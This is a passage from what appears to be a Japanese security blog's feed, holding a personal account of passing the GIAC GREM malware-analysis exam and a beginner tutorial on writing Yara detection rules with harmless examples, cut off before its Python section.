&lt;h2 id=&#34;はじめに&#34;&gt;はじめに&lt;/h2&gt;

&lt;p&gt;今回GREMと呼ばれるGIACのマルウェア解析系の資格試験を受けてきて、見事81.33%で合格することができた。この資格については、あまり情報を公開できないのだが、触れられる範囲で勉強法など当日までの道のりをメモしておく。私自身、初めてGIACの試験を受けたのだが、あまり事前情報がない(日本国内の)ため、今後受ける人の参考になると嬉しい。&lt;/p&gt;

&lt;p&gt;はじめに、この手の話は筆者のスペックを語っておいた方が勉強時間や勉強方法などの参考になると思うので少し触れておく。私は、CTFを通して主にELFファイルの解析等を3年ほどやっているため、普通のx86やamd64のバイナリ(逆アセンブル結果)なら苦じゃなく読むことはできる。しかしながら、PEバイナリなどWindows環境やWin32 API、今流行りのマルウェアやキャンペーンなどについては、ド素人である。マルウェアがどういうレジストリキーを書き込むとか、どんなファイルを作成するとかその手の話題も正直あまり詳しくない。そこで、私は2019年3月にSANS For 610というコースに参加してきた。そのため、何もトレーニングを受けてない人に比べるとかなり優位ではある。このコースでは、主に前述した内容などを学んできた。そのため、当初に比べるとかなりスキルは上がったような気はする。また、英語スキル的には、英語で書かれたドキュメントや技術洋書は苦じゃなく読むことができるが、ちょこちょこ英単語ググりながら読んでるレベルである。正直得意ではない。以上がざっとしたスペックである。&lt;/p&gt;

&lt;h2 id=&#34;勉強方法&#34;&gt;勉強方法&lt;/h2&gt;

&lt;p&gt;トレーニングを受講してから、およそ4ヵ月以内に本試験を受けなければならない。社会人2年目になった私は、あまり勉強時間が取れないと思い、このGWに勉強しようと決めてGWに突入した。当初の予定では、このGWに勉強して、受験期限日のギリギリに試験を受ける予定だった。&lt;/p&gt;

&lt;p&gt;SANS For610では、5日間にかけて講義を行う。そのため、5つのテキストが手元にはある。そこで、1日1冊を丁寧に復習するようにした。1冊復習するのに、だいたい5,6時間はかかったと思う。テキストの復習では、主にテキストの内容をざーっと眺めつつ、トレーニング中にやっていた演習などをやり直した。しかしながら、バイナリ解析の基本的なところはすでに得意分野だったので、x86アセンブリ自体の話などは斜め読み程度だった。特に苦手なPE周りやマルウェアの特徴的な挙動だったり解析方法、ツールの使い方などに注力した。&lt;a href=&#34;https://www.giac.org/certification/reverse-engineering-malware-grem&#34;&gt;公式サイト&lt;/a&gt;で、試験でどんなことが問われるかなどは書いてあるので、絶対に見るべし。&lt;/p&gt;

&lt;p&gt;GIACの試験では、トレーニングテキストを持ち込むことができるため、必要なことをすべて丸暗記する必要はないが、ある程度覚えておいたほうが必要なときに参照するスピードがあがるので良い。また、英語の試験だが、&lt;strong&gt;紙の辞書も持ち込める&lt;/strong&gt; ため英語に自信がないなら持ち込んだほうが良い。&lt;/p&gt;

&lt;p&gt;すべてのテキストを復習し終えたら、模擬試験を受けた（模擬試験のスコアが73,4%程度だったので、実はこの時かなりスレスレで、内心険しかった。）。模擬試験を受ける際は、&lt;strong&gt;本番と同じ時間、状況で行う&lt;/strong&gt;ことをおすすめする。そのため、紙の辞書なども用意して受けた。あまり問題などについては詳しくいえないが、模擬試験を受けると結果が見れるので、そこで苦手分野を特定して、再度その分野を勉強し直した。その際は、最初よりもより丁寧にテキストを読み込んだり、少しでも詰まった単語や挙動、概念などについてはテキストにとどまらずググって知識を補完した。模擬試験ではだいたい試験時間の半分以下で解答し終わっていたので、&lt;strong&gt;本番は丁寧に英文を読み、時間をいっぱい使おう&lt;/strong&gt;と決めた。また、私は、模擬試験を受けた翌日に本試験を申し込んでいたので、苦手分野を復習し終えた後は、ひたすら寝る時間が来るまでテキストの精読と疑問点や気になったところの知識の補完に努めた。このフェーズでは、もう演習系はやらなかった。総合計の勉強時間としては、30~40時間ほどはやったと思う。&lt;/p&gt;

&lt;h2 id=&#34;当日&#34;&gt;当日&lt;/h2&gt;

&lt;p&gt;当時は、朝起きてすぐに昨日の復習をして、試験開始の1時間前ぐらいに試験会場に向かった。事前に本人確認などの手続きがあるため、最低でも15分前に来いと書かれていた。持ち物としては、私が受けた試験会場（もしくはGIAC）では、顔写真付きの公的証明書系が2つ必要だったので、パスポートとマイナンバーカードを持っていた。また、試験予約したときのメールも印刷しろと書かれていたので、持っていった。&lt;strong&gt;正直ここらへんは、人の記事読むよりはちゃんと自分で現時点で必要なものを確認する&lt;/strong&gt;ことをおすすめする。その他、トレーニングテキスト一式と紙の英和辞典を持っていた。&lt;/p&gt;

&lt;h2 id=&#34;試験中&#34;&gt;試験中&lt;/h2&gt;

&lt;p&gt;パソコンでぽちぽちやるのだが、トレーニングテキストを持ち込むとやたらと机が狭くなり難しかった。それに加え辞書などを持ち込んでいると机が狭く圧迫感を感じるので気をつけてほしい。試験中は、ひたすら問題解くのとテキストや紙の辞書をめくりまくった記憶がある。私の場合は、模擬試験でかなり時間が余っていたので、すぐに答えがわかっても再度テキストを見直して本当にあってるかなどを再確認したりして解いていった。これでケアレスミスを防げたので、この作業が合否を分けたと思う。結果として、1時間30程度で本試験を終えた。また、本試験の特徴として、わからない問題など後で見返すために問題をスキップできるのだが、結局10問ほどはそれをやって最後に解いた。定期的に、「あーこの話どこかで見たけどテキストで見つからねぇ・・・」みたいなのがやってくるから、そういいった問題はすぐにスキップした。最終問題を解き終えると、その場で合否がわかる。そのため、「この問題があってれば合格できる！」といった願掛けみたいなことを脳内で思って答えた。最終問題を答え、出てきた画面には、合格を表す文章が現れていた。やったぜ。&lt;/p&gt;

&lt;h2 id=&#34;やっておけばよかったこと&#34;&gt;やっておけばよかったこと&lt;/h2&gt;

&lt;p&gt;合格しておいてアレだが、個人的にやっておけばよかったことを箇条書きでまとめておく。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;もっと詳細にテキストを読み込む&lt;/li&gt;
&lt;li&gt;テキストだけでとどまらず用語や挙動などをインターネットで調べる&lt;/li&gt;
&lt;li&gt;英語の勉強

&lt;ul&gt;
&lt;li&gt;文意が読み取りにくいことがあり、何を問われているか若干わからず時間を溶かした&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;紙の辞書をめくる練習

&lt;ul&gt;
&lt;li&gt;久しぶりで結構もたついた&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;おわりに&#34;&gt;おわりに&lt;/h2&gt;

&lt;p&gt;以上が、GREM合格までの話である。一般に、資格試験というのは比較的勉強した成果がちゃんとついてきてくれるものだと思っている。受ける方は、ぜひいっぱい勉強して受かってほしい。この試験勉強を通して学んだことはとても有意義で良いスキルが身についたと思った。&lt;s&gt;某なんちゃら支援士よりもよっぽどスキルが身についた気がする。&lt;/s&gt;&lt;/p&gt;

&lt;p&gt;所感だが、なんとかGWの勉強の成果が出てよかった。実は、本試験は、受験期限日のギリギリに受ける予定だったのだが、模擬試験でスコアがふるわず若干ヤケになって模擬試験を受けた翌日に試験を申し込んでいた。その結果、夜に飲み会があるのに、午前中に試験を受けるというアホなスケジュールになってしまった。不合格だったら落ち込んで飲み会に行くつもりだったが、それは避ける事ができたよかった。&lt;/p&gt;

&lt;p&gt;最後に、勉強時間を捻出するために、家事など全面的に協力してくれた奥さんに感謝したいと思う。&lt;/p&gt;
</description>
    </item>
    <item>
      <title>平成のうちに理解しておくYara 入門</title>
      <link>https://owlinux1000.github.io/blog/post/yara/</link>
      <pubDate>Mon, 29 Apr 2019 07:03:53 +0900</pubDate>
      <guid>https://owlinux1000.github.io/blog/post/yara/</guid>
      <description>

&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;平成も終わるし、知ったかぶりしてる技術を令和に持ち越さないようにしような&amp;rdquo;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&#34;目次&#34;&gt;目次&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Yara とは&lt;/li&gt;
&lt;li&gt;はじめてのYara ルール&lt;/li&gt;
&lt;li&gt;文字列を用いたYara ルール&lt;/li&gt;
&lt;li&gt;正規表現を用いたYara ルール&lt;/li&gt;
&lt;li&gt;複数条件を用いたYara ルール&lt;/li&gt;
&lt;li&gt;Yara の便利機能&lt;/li&gt;
&lt;li&gt;モジュール機能を用いたYara ルール&lt;/li&gt;
&lt;li&gt;Pythonから利用するYara ルール&lt;/li&gt;
&lt;li&gt;まとめ&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;yara-とは&#34;&gt;Yara とは&lt;/h2&gt;

&lt;p&gt;Yaraは、「&lt;strong&gt;Yara ルール&lt;/strong&gt;」と呼ばれる専用のルールを用いて、マルウェアや悪意あるファイルなどを検知することのできるツールです。Yara ルールでは、文字列による検査や正規表現、論理条件などをサポートしており複雑なルールを構築することもできます。利用例として、あるマルウェアファミリーの特徴をYara ルールとして作成しておくことで、新しいマルウェアが発見されたときに既知のマルウェアファミリーに性質が近いかどうかなどを検知することができます。Yara は、&lt;a href=&#34;https://cuckoosandbox.org/&#34; target=&#34;_blank&#34;&gt;Cuckoo Sandbox&lt;/a&gt;など他のセキュリテイツールと連携していることが多く、セキュリテイに関わる人間としては、一度読み書きしておいた方が良いツールの１つです。本記事では、Yara を使ったこと無い人向けに基本的な概念やルールを幅広くご紹介します。&lt;br /&gt;
まずは、Yara を利用するためにインストールしましょう。Ubuntu では、&lt;code&gt;apt&lt;/code&gt;からインストールすることができます。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;$ sudo apt install yara&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;また、Macでは&lt;code&gt;brew&lt;/code&gt;からインストールすることが可能です。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;$ brew install yara&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;インストールできたら、以下のコマンドを入力して、Yara のバージョンを確認してください。なお本記事では、バージョン3.9.0を対象に執筆しています。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;$ yara --version
3.9.0&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;はじめてのyara-ルール&#34;&gt;はじめてのYara ルール&lt;/h2&gt;

&lt;p&gt;では、さっそくはじめてのYara ルールを作成してみましょう。以下に、必ず検知するルールを示します。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;// hello_rule.yara
rule hello
{
    condition:
        true
}&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Yaraでは、&lt;code&gt;rule&lt;/code&gt;キーワードを用いてルールを作成します。ここで&lt;code&gt;hello&lt;/code&gt;はルール名にあたり、実際の条件が&lt;code&gt;condition&lt;/code&gt;が&lt;code&gt;true&lt;/code&gt;のときに検知することを意味しています。本例では、一般的なプログラミング言語と同様に、条件文が必ず真となります。そのため、必ず検知することができます。また、先頭の1行目は、コメント文です。Yara ルールのファイルの拡張子は、&lt;code&gt;.yara&lt;/code&gt;や&lt;code&gt;.yar&lt;/code&gt;の場合が多いです。&lt;br /&gt;
では、このルールを用いて実際に検知するか確認してみましょう。そのために検査対象となるファイルを&lt;code&gt;hello.txt&lt;/code&gt;として以下の内容で作成してください。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;HelloWorld!&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;以下の以下コマンドを実行してください。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;$ yara hello_rule.yara hello.txt
hello hello.txt&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;本コマンドでは、&lt;code&gt;hello.txt&lt;/code&gt;ファイルに対して、&lt;code&gt;hello_rule.yara&lt;/code&gt;を用いて検査しています。また、&lt;code&gt;hello&lt;/code&gt;というルールで&lt;code&gt;hello.txt&lt;/code&gt;が検知していることがわかります。
Yara ルールによる検査は、ファイルの他にディレクトリやPIDを指定することもでき、それらの検査も行うことが可能となっています。&lt;/p&gt;

&lt;p&gt;Yara ルールは、特別なシンタックスで書かれているので、エディタ等のシンタックスハイライトや補完プラグインの利用をおすすめします。Emacs ユーザならば、melpaで&lt;code&gt;yara-mode&lt;/code&gt;が配布されているので、&lt;code&gt;package&lt;/code&gt;でインストールすることができます。&lt;/p&gt;

&lt;h2 id=&#34;文字列を用いたyara-ルール&#34;&gt;文字列を用いたYara ルール&lt;/h2&gt;

&lt;p&gt;先程の例では、無条件に合致するルールを作成していました。次は、&lt;code&gt;hello.txt&lt;/code&gt;に格納されている&lt;code&gt;HelloWorld!&lt;/code&gt;という文字列を含んでいるファイルを検知するルールを作成してみましょう。&lt;code&gt;condition&lt;/code&gt;の条件として、検知したい文字列を設定します。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;rule hello_string
{
    condition:
        &amp;#34;HelloWorld!&amp;#34;
}&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;本ルールを用いて、先程と同様に検査してみましょう。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;$ yara hello_string_rule.yara hello.txt
hello_string_rule(5): warning: Using literal string &amp;#34;HelloWorld!&amp;#34; in a boolean operation.
hello_string hello.txt&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;先程と同様に検知できましたが、警告が出ています。これは、文字列リテラルを用いて直接条件を設定しているため出ています。ルールの中で文字列を変数として定義し、その変数を用いることでこの警告は出力されなくなります。以下のようにルールを変更してください&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;rule hello_string
{
    strings:
        $s = &amp;#34;HelloWorld!&amp;#34;
    condition:
        $s
}&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code&gt;strings&lt;/code&gt;キーワードを用いて、変数を定義することができます。再度検査すると警告文が出てきません。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;$ yara hello_string.yara hello.txt
hello_string hello.txt&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Yara では、変数の後に様々なキーワードを設定することでより柔軟に検査することができます。例えば、以下のルールでは、検知したい文字列の後に、&lt;code&gt;nocase&lt;/code&gt;を記載することで、case-insentive に文字列を認識し、検査してくれます。そのため、&lt;code&gt;hEllOwORLD!&lt;/code&gt; といった文字列も検知することができます。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;rule hello_string
{
    strings:
        $s = &amp;#34;HelloWorld!&amp;#34; nocase
    condition:
        $s
}&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code&gt;nocase&lt;/code&gt;の他にも、&lt;code&gt;wide&lt;/code&gt;でUnicode文字列などの場合も検知することが可能となります。もしAscii文字列とUnicode文字列を両方検知したい場合は、&lt;code&gt;wide&lt;/code&gt; と&lt;code&gt;ascii&lt;/code&gt; の両方をつけることで可能となります。&lt;br /&gt;
&lt;code&gt;fullword&lt;/code&gt;を設定すると、検知した文字列が、アルファベット以外で終端してる場合のみ検知することが可能となります。（例：&lt;code&gt;apple&lt;/code&gt; を検知したい文字列に設定している場合に、&lt;code&gt;applejuice.com&lt;/code&gt;は検知しないが、&lt;code&gt;apple.com&lt;/code&gt;は検知することができる）&lt;/p&gt;

&lt;h2 id=&#34;正規表現を用いたyara-ルール&#34;&gt;正規表現を用いたYara ルール&lt;/h2&gt;

&lt;p&gt;Yara では、正規表現を用いた検査を行うことができます。例えば、&lt;code&gt;a&lt;/code&gt;から始まる文字列を検知する場合を考えてみます。正規表現を用いる場合は、以下のように&lt;code&gt;&amp;quot;&lt;/code&gt;ではなく、&lt;code&gt;/&lt;/code&gt;で囲います。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;rule regexp
{
    strings:
        $s1 = /^a/
    condition:
        $s1
}&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;また、正規表現においても、&lt;code&gt;nocase&lt;/code&gt;のようなキーワードを付与することもできます。&lt;/p&gt;

&lt;h2 id=&#34;複数条件を用いたyara-ルール&#34;&gt;複数条件を用いたYara ルール&lt;/h2&gt;

&lt;p&gt;今までのルールでは、単一の条件にマッチした場合でしたが、&lt;code&gt;condition&lt;/code&gt;に、論理演算子を用いることで、より複雑な条件を構築することができます。例として、以下の内容で&lt;code&gt;hello2.txt&lt;/code&gt;を作成してください。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;Hello World!&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;そして、&lt;code&gt;hello2.txt&lt;/code&gt;を先程作成した&lt;code&gt;hello_string_rule.yara&lt;/code&gt;で検査してみてください。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;$ yara hello_string_rule.yara hello2.txt&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;結果として検知されず何も表示されません。&lt;code&gt;hello_string_rule.yara&lt;/code&gt;では、&lt;code&gt;HelloWorld!&lt;/code&gt;をルールにしていたため、間にスペースがある&lt;code&gt;hello2.txt&lt;/code&gt;では検知することができませんでした。そこで次に、&lt;code&gt;Hello World!&lt;/code&gt;も条件として加え、&lt;code&gt;HelloWorld!&lt;/code&gt; または&lt;code&gt;Hello World!&lt;/code&gt;の場合に検知するようにルールを作成します。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;rule hello_string
{
    strings:
        $s1 = &amp;#34;HelloWorld!&amp;#34;
        $s2 = &amp;#34;Hello World!&amp;#34;
    condition:
        $s1 or $s2
}&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;上記ルールでは、文字列として2つ定義し、それらを&lt;code&gt;or&lt;/code&gt;で接続することで条件を構築しています。以下のように&lt;code&gt;hello.txt&lt;/code&gt;と&lt;code&gt;hello2.txt&lt;/code&gt;の両方を検査してみましょう。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;$ yara hello_string2_rule.yara hello2.txt
hello_string hello2.txt
$ yara hello_string2_rule.yara hello.txt
hello_string hello.txt&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;両方とも検知していることがわかります。&lt;br /&gt;
Yara には、&lt;code&gt;or&lt;/code&gt;以外にも&lt;code&gt;and&lt;/code&gt;や&lt;code&gt;not&lt;/code&gt;など様々な条件に使えるキーワードがあります。詳しくは、&lt;a href=&#34;https://yara.readthedocs.io/en/v3.5.0/writingrules.html&#34; target=&#34;_blank&#34;&gt;公式ドキュメント&lt;/a&gt;を参照してください。&lt;/p&gt;

&lt;h2 id=&#34;yara-の便利機能&#34;&gt;Yara の便利機能&lt;/h2&gt;

&lt;p&gt;ここでは、個人的に便利そうだなと思った機能をいくつかご紹介します。&lt;/p&gt;

&lt;h3 id=&#34;特別な値を用いたルール&#34;&gt;特別な値を用いたルール&lt;/h3&gt;

&lt;p&gt;Yara は、主にマルウェアを対象として検知を行うツールなため、標準で文字列マッチ以外にも便利な機能が備わっています。例えば、以下は、対象ファイルのファイルサイズが200KBより大きかった場合に検知するルールの例です。&lt;code&gt;filesize&lt;/code&gt;は、特別な値で元から検査対象のファイルのサイズが格納されています。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;rule FileSizeExample
{
    condition:
       filesize &amp;gt; 200KB
}&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;また、後述するモジュール機能を用いることで、より多くの特別な値をルールで利用することができます。&lt;/p&gt;

&lt;h3 id=&#34;yara-ルールのメタデータ&#34;&gt;Yara ルールのメタデータ&lt;/h3&gt;

&lt;p&gt;Yara ルールには、メタデータの設定を行うことが可能です。rule中に、&lt;code&gt;meta&lt;/code&gt;キーワードを用いることで、メタデータを格納することができます。以下に例を示します。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;rule FileSizeExample
{
    meta:
       description = &amp;#34;File size check&amp;#34;
    condition:
       filesize &amp;gt; 200KB
}&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;このルールでは、&lt;code&gt;description&lt;/code&gt;というメタデータを設定しています。このメタデータは、&lt;code&gt;yara&lt;/code&gt; コマンドのオプション&lt;code&gt;-m&lt;/code&gt; を設定することで表示することができます。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;$ yara -m elf_rule.yara hello
elf_64 [description=&amp;#34;File size check&amp;#34;] hello&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&#34;yara-ルールのタグ&#34;&gt;Yara ルールのタグ&lt;/h3&gt;

&lt;p&gt;メタデータと似た機能として、タグの設定を行うことも可能です。ルール名の後に、&lt;code&gt;:&lt;/code&gt;でタグ名を記載します。複数設定した場合は、スペースで分割して記載します。以下に&lt;code&gt;hello_rule&lt;/code&gt;にタグを設定した例を示します。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;rule hello : myfirstrule
{
    condition:
        true
}

rule hello2 : mysecondrule
{
    condition:
        true
}&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code&gt;hello&lt;/code&gt;ルールには、&lt;code&gt;myfirstrule&lt;/code&gt;、&lt;code&gt;hello2&lt;/code&gt;ルールには、&lt;code&gt;mysecondrule&lt;/code&gt;というタグを設定しています。今までのようにこのルールを用いて検査を行うと、以下のように&lt;code&gt;hello&lt;/code&gt;と&lt;code&gt;hello2&lt;/code&gt;の両方のルールにマッチしていることがわかります。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;$ yara hello_rule.yara hello.txt
hello hello.txt
hello2 hello.txt&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;しかしながら、タグを設定することで、特定のタグのルールのみを表示するといったフィルターのような処理を行うことができます。オプション&lt;code&gt;-t&lt;/code&gt; に、&lt;code&gt;myfirstrule&lt;/code&gt;を設定することで、&lt;code&gt;hello&lt;/code&gt;ルールのみを表示することが可能です。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;$ yara -t myfirstrule hello_rule.yara hello.txt
hello hello.txt&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&#34;yara-ルールを分割管理&#34;&gt;Yara ルールを分割管理&lt;/h3&gt;

&lt;p&gt;1ファイルに多くのYara ルールを記載することは、管理上の観点からも好ましくありません。そこで、Yara では&lt;code&gt;include&lt;/code&gt;文を利用することで分割されたファイルを読みこむことが可能となります。以下の例では、最初に作った&lt;code&gt;hello_rule&lt;/code&gt;を読み込んでいます。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;include &amp;#34;./hello_rule&amp;#34;
rule regexep
{
    strings:
        $s1 = /^a/
    condition:
        $s1
}&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;モジュール機能を用いたyara-ルール&#34;&gt;モジュール機能を用いたYara ルール&lt;/h2&gt;

&lt;p&gt;Yara には、モジュール機能があります。特に、PE モジュールは、マルウェア解析者にとってよく使うモジュールの1つです。PE モジュールの他にも、ELF モジュールやCuckoo モジュール、Hash モジュール、Magic モジュールなどがあります。モジュールは、&lt;code&gt;import&lt;/code&gt; 文を用いて読み込みます。今回は、ELF モジュールを用いた例を見てみましょう。以下は、ELFバイナリがx64向けの場合検知するルールです。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;import &amp;#34;elf&amp;#34;

rule elf_64
{
    condition:
        elf.machine == elf.EM_X86_64
}&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;本ルール検証のために、&lt;code&gt;Hello World!&lt;/code&gt;と表示するELFバイナリを作成します。以下のC言語のファイルを作成してください。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#bc7a00&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#bc7a00&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#bc7a00&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#bc7a00&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#b00040&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;main&lt;/span&gt;() {
  printf(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Hello World!&amp;#34;&lt;/span&gt;);
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;以下のようにコンパイルして、実行ファイルを作成してください。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;$ gcc hello.c -o hello&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;作成したELFバイナリに対して検査をすると検知していることがわかります。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;$ yara elf_rule.yara hello
elf_64 hello&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;次に、IOCなどでもよく使われるハッシュ値を用いたルールを作成してみましょう。ハッシュ値を求める処理は、Hash モジュールを読み込むことで利用できます。Hash モジュールでは、md5やsha1、 sha256の代表的なハッシュアルゴリズムによるハッシュ値が求められます。まずは、検査対象となる&lt;code&gt;hello.txt&lt;/code&gt;のsha256ハッシュ値を求めてみましょう。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;$ shasum -a 256 hello.txt
209a3f843d2a572c2d66457dd7c8a6120fa308949867a5ebed5f4dca08fe4920  hello.txt&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;では、このハッシュ値を用いて、読み込んだファイルのハッシュ値と等しかったら検知させるルールを作成してみましょう。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;import &amp;#34;hash&amp;#34;
rule sha256
{
     condition:
         hash.sha256(0, filesize) == &amp;#34;209a3f843d2a572c2d66457dd7c8a6120fa308949867a5ebed5f4dca08fe4920&amp;#34;
}&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Hash モジュールのハッシュ値を求める機能では、2つの引数を設定できます。本例における前者の&lt;code&gt;0&lt;/code&gt;は、ファイルのオフセットを示しています。つまり、ファイルの先頭からのハッシュ値を求めようとしています。ファイルオフセットを適切に設定することで、生の攻撃ペイロードの不要部分を飛ばし、適切な位置からハッシュ値を求めることも可能となります。また、2つ目の引数は、サイズを示しており、今回の例だと&lt;code&gt;filesize&lt;/code&gt;つまり、ファイル全体を示しています。そのため、第1引数に&lt;code&gt;0&lt;/code&gt;、第2引数に&lt;code&gt;filesize&lt;/code&gt;を設定することで、ファイル全体のハッシュ値を算出することができます。本機能における戻り値のハッシュ値は、lowercase で帰ってくるため、比較する際には気をつけてください。&lt;/p&gt;

&lt;h2 id=&#34;pythonから利用するyara-ルール&#34;&gt;Pythonから利用するYara ルール&lt;/h2&gt;

&lt;p&gt;Yara ルールのファイルは、&lt;code&gt;yara&lt;/code&gt;コマンドだけでなく、Pythonから利用することも可能です。Python から利用することで、よりプログラマブルにYara を利用することができるため、システムに組み込むことが容易になります。利用するためには、&lt;code&gt;yara-python&lt;/code&gt;というライブラリをインストールしてください。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;$ pip install yara-python&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;では、2つ目に作成した&lt;code&gt;hello_string_rule&lt;/code&gt;のYara ルールファイルを読み込んで検査してみましょう。以下の検査スクリプトを&lt;code&gt;hello.py&lt;/code&gt;として作成してください。&lt;/p&gt;
